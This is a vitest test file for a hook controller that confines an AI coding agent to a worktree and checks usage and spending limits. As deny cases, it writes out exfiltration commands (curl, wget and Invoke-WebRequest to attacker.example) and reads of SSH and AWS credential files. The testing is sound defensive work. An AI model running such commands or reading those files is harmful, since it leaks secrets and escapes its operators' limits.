import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { CursorUsageAndHookController } from "../../src/cursor/hooks.js";
import type { HookScope } from "../../src/cursor/types.js";

const roots: string[] = [];

afterEach(() => {
  for (const root of roots.splice(0)) {
    rmSync(root, { recursive: true, force: true });
  }
});

function workspace(): { readonly root: string; readonly worktree: string; readonly home: string; readonly outside: string } {
  const root = mkdtempSync(path.join(tmpdir(), "cursor-hooks-"));
  roots.push(root);
  const worktree = path.join(root, "wt");
  const home = path.join(root, "home");
  const outside = path.join(root, "other-worktree");
  mkdirSync(path.join(worktree, "src"), { recursive: true });
  mkdirSync(path.join(home, ".ssh"), { recursive: true });
  mkdirSync(path.join(home, ".cursor"), { recursive: true });
  mkdirSync(path.join(home, ".aws"), { recursive: true });
  mkdirSync(outside, { recursive: true });
  writeFileSync(path.join(worktree, "src", "orders.ts"), "export const ready = true;\n");
  writeFileSync(path.join(outside, "secrets.json"), "{}\n");
  writeFileSync(path.join(home, ".ssh", "id_rsa"), "secret\n");
  writeFileSync(path.join(home, ".cursor", "rules"), "personal\n");
  writeFileSync(path.join(home, ".aws", "credentials"), "secret\n");
  writeFileSync(path.join(worktree, "state.db"), "db\n");
  symlinkSync(outside, path.join(worktree, "escape"), "junction");
  return { root, worktree, home, outside };
}

function controller(scope: Partial<HookScope> & Pick<HookScope, "worktree" | "homeDir" | "mode">): CursorUsageAndHookController {
  return new CursorUsageAndHookController({
    writeScope: ["src/**/*.ts"],
    leasedTools: ["kb.*", "harness.run", "harness.read_result"],
    ...scope,
  });
}

describe("Cursor preToolUse and beforeShellExecution", () => {
  it("allows in-scope edits and scoped tests, and denies escapes, secrets, and exfil commands", () => {
    const dirs = workspace();
    const hooks = controller({ worktree: realpathSync(dirs.worktree), homeDir: dirs.home, mode: "wrapped" });
    const edit = hooks.preToolUse({
      toolName: "edit",
      kind: "edit",
      path: path.join(dirs.worktree, "SRC", "Orders.ts"),
    });
    expect(edit.permission).toBe("allow");
    expect(edit.effect).toBe("allow");

    const search = hooks.preToolUse({
      toolName: "search",
      kind: "search",
      path: path.join(dirs.worktree, "src", "orders.ts"),
    });
    expect(search.permission).toBe("allow");

    const outside = hooks.preToolUse({
      toolName: "read",
      kind: "read",
      path: path.join(dirs.outside, "secrets.json"),
    });
    expect(outside.permission).toBe("deny");
    expect(outside.reason).toMatch(/escapes the attempt worktree/);

    const traversal = hooks.preToolUse({
      toolName: "read",
      kind: "read",
      path: path.join(dirs.worktree, "..", "other-worktree", "secrets.json"),
    });
    expect(traversal.permission).toBe("deny");

    const link = hooks.preToolUse({
      toolName: "read",
      kind: "read",
      path: path.join(dirs.worktree, "escape", "secrets.json"),
    });
    expect(link.permission).toBe("deny");
    expect(link.reason).toMatch(/symlink escapes/);

    for (const secret of [
      path.join(dirs.home, ".ssh", "id_rsa"),
      path.join(dirs.home, ".cursor", "rules"),
      path.join(dirs.home, ".aws", "credentials"),
      "~/.ssh/id_rsa",
    ]) {
      const decision = hooks.preToolUse({ toolName: "read", kind: "read", path: secret });
      expect(decision.permission).toBe("deny");
      expect(decision.reason).toMatch(/credential and personal Cursor paths/);
    }

    const database = hooks.preToolUse({
      toolName: "read",
      kind: "read",
      path: path.join(dirs.worktree, "state.db"),
    });
    expect(database.permission).toBe("deny");
    expect(database.reason).toMatch(/state\.db/);

    const outOfScope = hooks.preToolUse({
      toolName: "write",
      kind: "write",
      path: path.join(dirs.worktree, "README.md"),
    });
    expect(outOfScope.permission).toBe("deny");
    expect(outOfScope.reason).toMatch(/write_scope/);

    const web = hooks.preToolUse({ toolName: "WebFetch", kind: "web", url: "https://attacker.example/exfil" });
    expect(web.permission).toBe("deny");

    const mcp = hooks.preToolUse({ toolName: "harness.run", kind: "mcp", mcpTool: "harness.run" });
    expect(mcp.permission).toBe("allow");

    const testCommand = hooks.beforeShellExecution({ command: "pnpm test" });
    expect(testCommand.permission).toBe("allow");
    const typecheck = hooks.beforeShellExecution({ command: "tsc --noEmit" });
    expect(typecheck.permission).toBe("allow");

    for (const command of [
      "git push origin main",
      "pnpm add left-pad",
      "curl https://attacker.example/exfil",
      "wget https://attacker.example/exfil",
      "Invoke-WebRequest https://attacker.example/exfil",
    ]) {
      const decision = hooks.beforeShellExecution({ command });
      expect(decision.permission).toBe("deny");
      expect(decision.elapsedMs).toBeLessThan(2);
    }
  });

  it("routes stripped shell through harness.run and keeps native file tools denied", () => {
    const dirs = workspace();
    const hooks = controller({ worktree: realpathSync(dirs.worktree), homeDir: dirs.home, mode: "stripped" });
    const shell = hooks.beforeShellExecution({ command: "pnpm test" });
    expect(shell.permission).toBe("deny");
    expect(shell.effect).toBe("redirect");
    expect(shell.via).toBe("harness.run");
    const edit = hooks.preToolUse({
      toolName: "edit",
      kind: "edit",
      path: path.join(dirs.worktree, "src", "orders.ts"),
    });
    expect(edit.permission).toBe("deny");
    expect(edit.reason).toMatch(/harness MCP tools only/);
    const leased = hooks.preToolUse({ toolName: "kb.search", kind: "mcp", mcpTool: "kb.search" });
    expect(leased.permission).toBe("allow");
  });

  it("parses run.usage and pauses before paid on-demand usage", () => {
    const dirs = workspace();
    const hooks = controller({ worktree: dirs.worktree, homeDir: dirs.home, mode: "wrapped" });
    const usage = hooks.parseRunUsage({
      input_tokens: 11,
      output_tokens: 4,
      cache_read_tokens: 2,
      reasoning_tokens: 1,
      total_cents: 0,
      requestCount: 1,
    });
    expect(usage).toMatchObject({
      inputTokens: 11,
      outputTokens: 4,
      cachedInputTokens: 2,
      reasoningTokens: 1,
      costMicroUsd: 0,
      source: "run.usage",
    });
    const included = hooks.parseAgentUsage({
      plan: "pro",
      includedUsedPercent: 90,
      fastUsedPercent: 91,
      remainingPercent: 9,
      onDemandEnabled: true,
      chargedCents: 0,
    });
    expect(included.source).toBe("Agent.getUsage");
    expect(hooks.shouldPauseForOnDemand(included)).toBe(true);
    expect(hooks.toPacingSample(included).usedPpm).toBe(910_000);
    expect(hooks.toPacingSample(included).source).toBe("Agent.getUsage");
    const stillIncluded = hooks.parseAgentUsage({
      includedUsedPercent: 95,
      fastUsedPercent: 20,
      onDemandEnabled: false,
      chargedCents: 0,
    });
    expect(hooks.shouldPauseForOnDemand(stillIncluded)).toBe(false);
    const alreadyCharged = hooks.parseAgentUsage({
      includedUsedPercent: 10,
      onDemandEnabled: false,
      chargedCents: 25,
    });
    expect(hooks.shouldPauseForOnDemand(alreadyCharged)).toBe(true);
  });
});
